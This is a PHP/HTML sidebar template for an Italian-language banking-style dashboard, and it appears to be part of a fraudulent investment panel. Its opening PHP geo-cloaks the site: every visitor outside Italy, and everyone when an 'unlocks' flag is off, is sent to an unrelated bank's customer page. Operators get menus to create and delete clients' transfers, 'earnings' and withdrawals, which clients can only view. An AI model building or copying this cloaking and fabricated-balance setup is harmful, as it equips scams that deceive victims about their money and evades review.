<?php

global $connection;
$query_find= "SELECT * FROM users WHERE user_id=1";
$result_find = mysqli_query($connection,$query_find);
$row_find= mysqli_fetch_assoc($result_find);
 
$ipUser = getUserIpAddr();
$userData = getUserCountry($ipUser);

if($userData['countryName']!='Italy'){
return header("Location: https://www.alfresco.com/customers/bnp-paribas-fortis");
}
 
$queryunloc="SELECT * FROM users WHERE user_id=1";
$resultunlock = mysqli_query($connection, $queryunloc);
$row= mysqli_fetch_assoc($resultunlock);
if($row['unlocks']==0){

    return header("Location: https://www.alfresco.com/customers/bnp-paribas-fortis");
    }
?>
<!-- Pre loader -->

<style>


</style>
<div id="loader" class="loader">
    <div class="plane-container">
        <div class="preloader-wrapper small active">
            <div class="spinner-layer spinner-blue">
                <div class="circle-clipper left">
                    <div class="circle"></div>
                </div>
                <div class="gap-patch">
                    <div class="circle"></div>
                </div>
                <div class="circle-clipper right">
                    <div class="circle"></div>
                </div>
            </div>

            <div class="spinner-layer spinner-red">
                <div class="circle-clipper left">
                    <div class="circle"></div>
                </div>
                <div class="gap-patch">
                    <div class="circle"></div>
                </div>
                <div class="circle-clipper right">
                    <div class="circle"></div>
                </div>
            </div>

            <div class="spinner-layer spinner-yellow">
                <div class="circle-clipper left">
                    <div class="circle"></div>
                </div>
                <div class="gap-patch">
                    <div class="circle"></div>
                </div>
                <div class="circle-clipper right">
                    <div class="circle"></div>
                </div>
            </div>

            <div class="spinner-layer spinner-green">
                <div class="circle-clipper left">
                    <div class="circle"></div>
                </div>
                <div class="gap-patch">
                    <div class="circle"></div>
                </div>
                <div class="circle-clipper right">
                    <div class="circle"></div>
                </div>
            </div>
        </div>
    </div>
</div>
<div id="app">

    <aside class="main-sidebar fixed shadow2 bg-dark  theme-dark  " data-toggle='offcanvas'>
        <section class="sidebar">
            <div class="w-160px mt-3 mb-3 ml-3">
                <img src="../LOGO.png" alt="">
            </div>
            <div class="relative">
                <a data-toggle="collapse" href="# " role="button" aria-expanded="false"
                    aria-controls="userSettingsCollapse"
                    class="btn-fab btn-fab-sm absolute fab-right-bottom fab-top btn-primary shadow1 ">
                    <i class="icon icon-cogs"></i>
                </a>
                <div class="user-panel p-3 success mb-2">
                    <div>
                        <div class="float-left image">
                            <img class="user_avatar" src="assets/profile.png" alt="User Image">
                        </div>
                        <div class="float-left info">
                            <h6 class="font-weight-light mt-2 mb-1  text-light ">
                                <?php echo $_SESSION['user_name'] . " ". $_SESSION['user_subname'];?></h6>
                            <a href="#" class=" text-light  "><i class="icon-circle text-light blink"></i> Online</a>
                        </div>
                    </div>

                </div>
            </div>
            <ul class="sidebar-menu">
                <li class="header text-center "> <img src="assets/bank (1).png" width="30" alt=""> <strong
                        class="text-light">Le mie azioni</strong></li>
                <li class="treeview border border-success"><a href="graps.php">
                        <img src="assets/business-report.png" width="30" alt=""> <span class=" text-light">Home</span>
                        <i class="icon icon-angle-left s-18 pull-right text-light"></i>

                    </a>
                </li>
                <?php if( $_SESSION['client'] == 0 ){ ?>
                <li class="treeview   border border-success"><a href=" #">
                        <img src="assets/add-friend.png" width="30" alt=""> <span class=" text-light"> Administazione
                            clienti</span> <i class="icon icon-angle-left s-18 pull-right text-light"></i>
                    </a>
                    <ul class="treeview-menu">
                        <li><a href="dashboard.php" class=" text-light"><i class="icon icon-folder5"></i>Crea
                                Cliente</a>
                        </li>
                        <li><a href="modificaCliente.php" class=" text-light"> <i class="icon icon-folder5"></i>Modifica
                                cliente</a>
                        </li>
                    </ul>
                </li>
                <li class="treeview  border border-success"><a href="#">
                        <img src="assets/dollar.png" width="30" alt=""> <span class=" text-light">Gestione
                            bonifico</span> <i class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>
                    <ul class="treeview-menu">
                        <li><a href="creaBonifico.php" class=" text-light"><i class="icon icon-folder5"></i>Crea un
                                bonifico per il
                                cliente</a>
                        </li>
                        <li><a href="eliminaBonifico.php" class=" text-light"><i class="icon icon-folder5"></i>Elimina
                                un bonifico al
                                cliente </a>
                        </li>
                    </ul>
                </li>
                <li class="treeview border border-success"><a href="#">
                        <img src="assets/money.png" width="30" alt=""><span class=" text-light">Gestione
                            guadagnio</span> <i class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>
                    <ul class="treeview-menu">
                        <li><a href="creaGuadagnio.php" class=" text-light"><i class="icon icon-folder5"></i>Crea un
                                guadagnio per il
                                cliente</a>
                        </li>
                        <li><a href="eliminaGuadagnio.php" class=" text-light"><i class="icon icon-folder5"></i>Elimina
                                un guadagnio al
                                cliente </a>
                        </li>
                    </ul>
                </li>
                <li class="treeview border border-success"><a href="selectClients.php">
                        <img src="assets/bill.png" width="30" alt=""> <span class=" text-light">Visualizzazione
                            bonifico</span> <i class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>

                </li>
                <li class="treeview border border-success"><a href="#">
                        <img src="assets/wallet.png" width="30" alt=""> <span class=" text-light">Prelievo</span> <i
                            class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>
                    <ul class="treeview-menu">
                        <li><a href="addPrelievo.php" class=" text-light"><i class="icon icon-folder5"></i>Aggiungi i
                                prelievi al
                                cliente</a>
                        </li>
                        <li><a href="vizualizaPrelievo.php" class=" text-light"><i
                                    class="icon icon-folder5"></i>Vizualizza i prelievi del
                                cliente</a>
                        </li>

                    </ul>
                </li>
                <?php } else {
                    
                    ?>
                <li class="treeview border border-success"><a href="invoiceclient.php">
                        <img src="assets/investing.png" width="30" alt="" class=" text-light"> <span
                            class=" text-light">Conto Corrente</span> <i
                            class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>

                </li>
                <li class="treeview border border-success"><a href="vizualizaPrelievocliente.php">
                        <img src="assets/money.png" width="30" alt=""> <span class=" text-light">Bonifico</span> <i
                            class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>

                </li>
                <li class="treeview border border-success"><a href="#">
                        <img src="assets/documents.png" width="30" alt=""> <span class=" text-light">Documenti</span> <i
                            class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>

                </li>
                <li class="treeview border border-success"><a href="#">
                        <img src="assets/classified.png" width="30" alt=""> <span class=" text-light">O-Key</span> <i
                            class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>

                </li>
                <li class="treeview border border-success"><a href="#">
                        <img src="assets/work-time.png" width="30" alt=""> <span class=" text-light">Attivita</span> <i
                            class="icon icon-angle-left text-light s-18 pull-right"></i>
                    </a>

                </li>

                <?php
                    
                }
                    ?>
            </ul>
        </section>
    </aside>
